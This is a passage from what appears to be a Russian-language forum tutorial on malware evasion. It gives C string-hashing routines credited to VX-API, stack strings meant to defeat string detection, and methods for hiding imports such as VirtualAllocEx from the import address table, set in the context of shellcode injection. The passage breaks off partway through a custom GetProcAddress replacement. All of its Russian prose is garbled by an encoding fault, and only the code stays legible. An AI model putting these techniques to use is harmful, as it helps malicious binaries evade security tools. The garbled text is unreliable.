–†–µ–∞–ª–∏–∑–∞—Ü–∏—è Djb2, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–∞—è –Ω–∏–∂–µ, –≤–∑—è—Ç–∞ –∏–∑ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è VX-API –Ω–∞ GitHub.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define INITIAL_HASH    3731  // –¥–æ–±–∞–≤–ª–µ–Ω–æ –¥–ª—è —Ä–∞–Ω–¥–æ–º–∏–∑–∞—Ü–∏–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è
#define INITIAL_SEED    7     // –≥–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π Djb2 –∏–∑ —Å—Ç—Ä–æ–∫ ASCII
DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash &lt;&lt; INITIAL_SEED) + Hash) + c;

    return Hash;
}

// –≥–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π Djb2 –∏–∑ —Å—Ç—Ä–æ–∫ –≤ —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–∞—Ö
DWORD HashStringDjb2W(_In_ PWCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash &lt;&lt; INITIAL_SEED) + Hash) + c;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>JenkinsOneAtATime32Bit</b><br />
<br />
–ê–ª–≥–æ—Ä–∏—Ç–º JenkinsOneAtATime32Bit —Ä–∞–±–æ—Ç–∞–µ—Ç, –∏—Ç–µ—Ä–∏—Ä—É—è—Å—å –ø–æ —Å–∏–º–≤–æ–ª–∞–º –≤–æ –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ –∏ –∏–Ω–∫—Ä–µ–º–µ–Ω—Ç–∞–ª—å–Ω–æ –æ–±–Ω–æ–≤–ª—è—è —Ç–µ–∫—É—â–µ–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ –≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–∏ —Å –∑–Ω–∞—á–µ–Ω–∏–µ–º –∫–∞–∂–¥–æ–≥–æ —Å–∏–º–≤–æ–ª–∞. –ê–ª–≥–æ—Ä–∏—Ç–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ.<br />
<br />
hash += c; hash += (hash &lt;&lt; 10); hash ^= (hash &gt;&gt; 6); hash - —Ç–µ–∫—É—â–µ–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ, –∞ c - —Ç–µ–∫—É—â–∏–π —Å–∏–º–≤–æ–ª –≤–æ –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ.<br />
<br />
–†–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–µ–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ - —ç—Ç–æ 32-–±–∏—Ç–Ω–æ–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, —É–Ω–∏–∫–∞–ª—å–Ω–æ–µ –¥–ª—è –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏. –ò–∑–≤–µ—Å—Ç–Ω–æ, —á—Ç–æ –∞–ª–≥–æ—Ä–∏—Ç–º JenkinsOneAtATime32Bit –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ —Ö–æ—Ä–æ—à–µ–µ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–π, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –Ω–∏–∑–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –∫–æ–ª–ª–∏–∑–∏–π –º–µ–∂–¥—É —Ä–∞–∑–Ω—ã–º–∏ —Å—Ç—Ä–æ–∫–∞–º–∏ –∏ –∏—Ö —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º–∏ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è–º–∏.<br />
<br />
–†–µ–∞–ª–∏–∑–∞—Ü–∏—è JenkinsOneAtATime32Bit, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–∞—è –Ω–∏–∂–µ, –≤–∑—è—Ç–∞ –∏–∑ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è VX-API –Ω–∞ GitHub.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define INITIAL_SEED    7    // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π JenkinsOneAtATime32Bit –∏–∑ —Å—Ç—Ä–æ–∫ ASCII
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π JenkinsOneAtATime32Bit –∏–∑ —Å—Ç—Ä–æ–∫ –≤ —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–∞—Ö
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash &lt;&lt; INITIAL_SEED;
        Hash ^= Hash &gt;&gt; 6;
    }

    Hash += Hash &lt;&lt; 3;
    Hash ^= Hash &gt;&gt; 11;
    Hash += Hash &lt;&lt; 15;

    return Hash;
}</code></pre>
	</div>
</div><br />
<b>Rotr32 </b><br />
<br />
–ê–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ Rotr32 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∏—Ç–µ—Ä–∏—Ä—É–µ–º—ã–µ —Å–∏–º–≤–æ–ª—ã –≤–æ –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ –¥–ª—è —Å—É–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –∏—Ö ASCII-–∑–Ω–∞—á–µ–Ω–∏–π, –∞ –∑–∞—Ç–µ–º –ø—Ä–∏–º–µ–Ω—è–µ—Ç –±–∏—Ç–æ–≤–æ–µ –≤—Ä–∞—â–µ–Ω–∏–µ –∫ —Ç–µ–∫—É—â–µ–º—É –∑–Ω–∞—á–µ–Ω–∏—é —Ö–µ—à–∞. –í—Ö–æ–¥–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∏ —Å—á–µ—Ç (—Å—á–µ—Ç —Ä–∞–≤–µ–Ω INITIAL_SEED) –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–¥–≤–∏–≥–∞ –≤–ø—Ä–∞–≤–æ –Ω–∞ —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ, –∑–∞—Ç–µ–º –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è –æ–ø–µ—Ä–∞—Ü–∏—è –ò–õ–ò —Å –∏—Å—Ö–æ–¥–Ω—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º, —Å–¥–≤–∏–Ω—É—Ç—ã–º –≤–ª–µ–≤–æ –Ω–∞ –æ—Ç—Ä–∏—Ü–∞–Ω–∏–µ —Å—á–µ—Ç–∞.<br />
<br />
–†–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–µ–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ - —ç—Ç–æ 32-–±–∏—Ç–Ω–æ–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, —É–Ω–∏–∫–∞–ª—å–Ω–æ–µ –¥–ª—è –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏. –ò–∑–≤–µ—Å—Ç–Ω–æ, —á—Ç–æ Rotr32 –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ —Ö–æ—Ä–æ—à–µ–µ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–π, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –Ω–∏–∑–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –∫–æ–ª–ª–∏–∑–∏–π –º–µ–∂–¥—É —Ä–∞–∑–Ω—ã–º–∏ —Å—Ç—Ä–æ–∫–∞–º–∏ –∏ –∏—Ö —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º–∏ —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è–º–∏.<br />
<br />
–†–µ–∞–ª–∏–∑–∞—Ü–∏—è Rotr32, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–∞—è –Ω–∏–∂–µ, –≤–∑—è—Ç–∞ –∏–∑ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è VX-API –Ω–∞ GitHub.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define INITIAL_SEED    5 // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–º–µ–Ω—è–µ—Ç –±–∏—Ç–æ–≤–æ–µ –≤—Ä–∞—â–µ–Ω–∏–µ
UINT32 HashStringRotr32Sub(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
    Count &amp;= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (Value &gt;&gt; Count) | (Value &lt;&lt; ((-Count) &amp; Mask));
#pragma warning( pop )
}

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π Rotr32 –∏–∑ —Å—Ç—Ä–æ–∫ ASCII
INT HashStringRotr32A(_In_ PCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index &lt; lstrlenA(String); Index++)
        Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

    return Value;
}

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ö–µ—à–µ–π Rotr32 –∏–∑ —Å—Ç—Ä–æ–∫ –≤ —à–∏—Ä–æ–∫–∏—Ö —Å–∏–º–≤–æ–ª–∞—Ö
INT HashStringRotr32W(_In_ PWCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index &lt; lstrlenW(String); Index++)
        Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

    return Value;
}</code></pre>
	</div>
</div><br />
<b>–°—Ç–µ–∫ —Å—Ç—Ä–æ–∫–∏</b><br />
<br />
–í —è–∑—ã–∫–∞—Ö –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è C/C++ —Å—Ç—Ä–æ–∫—É –º–æ–∂–Ω–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å –∫–∞–∫ –º–∞—Å—Å–∏–≤ —Å–∏–º–≤–æ–ª–æ–≤, —Ä–∞–∑–¥–µ–ª—è—è —Å–∏–º–≤–æ–ª—ã –¥—Ä—É–≥ –æ—Ç –¥—Ä—É–≥–∞, —á—Ç–æ –ø–æ–º–æ–≥–∞–µ—Ç –∏–∑–±–µ–≥–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å—Ç—Ä–æ–∫. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å—Ç—Ä–æ–∫—É &quot;hello world&quot; –º–æ–∂–Ω–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>char string[] = { &#039;h&#039;, &#039;e&#039;, &#039;l&#039;, &#039;l&#039;, &#039;o&#039;, &#039; &#039;, &#039;w&#039;, &#039;o&#039;, &#039;r&#039;, &#039;l&#039;, &#039;d&#039;, &#039;\0&#039; };</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784427195.png"
		data-src="https://osint42.org/attachments/1746784427195-png.176/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784427195-png.176/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784427195.png"
			title="1746784427195.png"
			width="1920" height="732" loading="lazy" />
	</div><br />
<br />
–ü–æ–∏—Å–∫ —Å—Ç—Ä–æ–∫–∏ &quot;hello world&quot; —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ HxD –Ω–∏—á–µ–≥–æ –Ω–µ –≤–µ—Ä–Ω–µ—Ç.<br />
<br />
–û–¥–Ω–∞–∫–æ —Å—Ç–µ–∫–∞ —Å—Ç—Ä–æ–∫–∏ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ, —á—Ç–æ–±—ã —Å–∫—Ä—ã—Ç—å —Å—Ç—Ä–æ–∫—É –æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤ –∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –æ–±—Ä–∞—Ç–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –ø–ª–∞–≥–∏–Ω—ã –¥–ª—è –∏—Ö –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è.<br />
<br />
–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è —Ç–∞–∫–∂–µ —à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Å—Ç—Ä–æ–∫–∏, –µ—Å–ª–∏ –æ–Ω–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ.)</div>
						

							<h2>–ò–∑—É—á–∞–µ–º –∫—É–Ω–≥—Ñ—É-1. –°–∫—Ä—ã—Ç–∏–µ —Ç–∞–±–ª–∏—Ü—ã –∏–º–ø–æ—Ä—Ç–∞</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746784703357.png"
		data-src="https://osint42.org/attachments/1746784703357-png.177/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784703357-png.177/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784703357.png"
			title="1746784703357.png"
			width="1340" height="890" loading="lazy" />
	</div><br />
<br />
–¢–∞–±–ª–∏—Ü–∞ –∏–º–ø–æ—Ä—Ç–Ω—ã—Ö –∞–¥—Ä–µ—Å–æ–≤ (IAT) —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ñ–∞–π–ª–µ PE, —Ç–∞–∫—É—é –∫–∞–∫ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ DLL, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â–∏–µ –∏—Ö. –≠—Ç–æ—Ç —Ç–∏–ø –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–∏–≥–Ω–∞—Ç—É—Ä—ã –∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –¥–≤–æ–∏—á–Ω–æ–≥–æ –∫–æ–¥–∞.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ç–∞–±–ª–∏—Ü—É –∏–º–ø–æ—Ä—Ç–Ω—ã—Ö –∞–¥—Ä–µ—Å–æ–≤ –ø—Ä–∏–º–µ—Ä–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏ —à–µ–ª–ª-–∫–æ–¥–∞.<br />
–§–∞–π–ª PE –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ —Å—á–∏—Ç–∞—é—Ç—Å—è –≤—ã—Å–æ–∫–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º–∏. –†–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–≥—É—Ç –∑–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è –¥–µ—Ç–µ–∫—Ç–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784712125.png"
		data-src="https://osint42.org/attachments/1746784712125-png.178/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784712125-png.178/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784712125.png"
			title="1746784712125.png"
			width="1212" height="954" loading="lazy" />
	</div><br />
<br />
<b>–°–æ–∫—Ä—ã—Ç–∏–µ –∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è IAT - –ú–µ—Ç–æ–¥ 1</b><br />
<br />
–ß—Ç–æ–±—ã —Å–∫—Ä—ã—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Ç IAT, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å GetProcAddress, GetModuleHandle –∏–ª–∏ LoadLibrary –¥–ª—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ —ç—Ç–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∑–∞–≥—Ä—É–∑–∏—Ç VirtualAllocEx –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏, –∏ –ø–æ—ç—Ç–æ–º—É –æ–Ω –Ω–µ –ø–æ—è–≤–∏—Ç—Å—è –≤ IAT –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef LPVOID (WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//...
fnVirtualAllocEx pVirtualAllocEx = GetProcAddress(GetModuleHandleA(&quot;KERNEL32.DLL&quot;), &quot;VirtualAllocEx&quot;);
pVirtualAllocEx(...);</code></pre>
	</div>
</div><br />
<b>–•–æ—Ç—è —ç—Ç–æ –º–æ–∂–µ—Ç –ø–æ–∫–∞–∑–∞—Ç—å—Å—è —ç–ª–µ–≥–∞–Ω—Ç–Ω—ã–º —Ä–µ—à–µ–Ω–∏–µ–º, –ø–æ —Ä—è–¥—É –ø—Ä–∏—á–∏–Ω —ç—Ç–æ –Ω–µ —Å–∞–º—ã–π –ª—É—á—à–∏–π —Å–ø–æ—Å–æ–±:</b><br />
<br />
–í–æ-–ø–µ—Ä–≤—ã—Ö, —Å—Ç—Ä–æ–∫–∞ VirtualAllocEx —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ –¥–≤–æ–∏—á–Ω–æ–º –∫–æ–¥–µ, —á—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏.<br />
GetProcAddress –∏ GetModuleHandleA –ø–æ—è–≤—è—Ç—Å—è –≤ IAT, —á—Ç–æ —Å–∞–º–æ –ø–æ —Å–µ–±–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ —Å–∏–≥–Ω–∞—Ç—É—Ä–∞.<br />
<br />
<b>–°–æ–∫—Ä—ã—Ç–∏–µ –∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è IAT - –ú–µ—Ç–æ–¥ 2</b><br />
<br />
–ë–æ–ª–µ–µ —ç–ª–µ–≥–∞–Ω—Ç–Ω—ã–º —Ä–µ—à–µ–Ω–∏–µ–º —è–≤–ª—è–µ—Ç—Å—è —Å–æ–∑–¥–∞–Ω–∏–µ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç —Ç–µ –∂–µ –¥–µ–π—Å—Ç–≤–∏—è, —á—Ç–æ –∏ GetProcAddress –∏ GetModuleHandle WinAPIs.<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤–æ–∑–º–æ–∂–Ω—ã–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∑–∞–≥—Ä—É–∂–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –±–µ–∑ –ø–æ—è–≤–ª–µ–Ω–∏—è —ç—Ç–∏—Ö –¥–≤—É—Ö —Ñ—É–Ω–∫—Ü–∏–π –≤ IAT.<br />
<br />
–§—É–Ω–∫—Ü–∏—è WinAPI GetProcAddress –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∞–¥—Ä–µ—Å —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –∏–∑ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –º–æ–¥—É–ª—è. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç NULL, –µ—Å–ª–∏ –∏–º—è —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–µ –º–æ–¥—É–ª—è.<br />
<br />
–í —ç—Ç–æ–π —á–∞—Å—Ç–∏ –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è, –∑–∞–º–µ–Ω—è—é—â–∞—è GetProcAddress. –ü—Ä–æ—Ç–æ—Ç–∏–ø –Ω–æ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {}</code></pre>
	</div>
</div><br />
<b>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç GetProcAddress</b><br />
<br />
–ü–µ—Ä–≤—ã–π –º–æ–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É—á–µ—Å—Ç—å, - —ç—Ç–æ —Ç–æ, –∫–∞–∫ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –∏ –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é WinAPI GetProcAddress.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä hModule - —ç—Ç–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–π DLL. –≠—Ç–æ –∞–¥—Ä–µ—Å, –≥–¥–µ –º–æ–¥—É–ª—å DLL –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞. –£—á–∏—Ç—ã–≤–∞—è —ç—Ç–æ, –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ø—É—Ç–µ–º –ø–µ—Ä–µ–±–æ—Ä–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –≤ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–π DLL –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è –∏–º–µ–Ω–∏ —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω–æ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ, 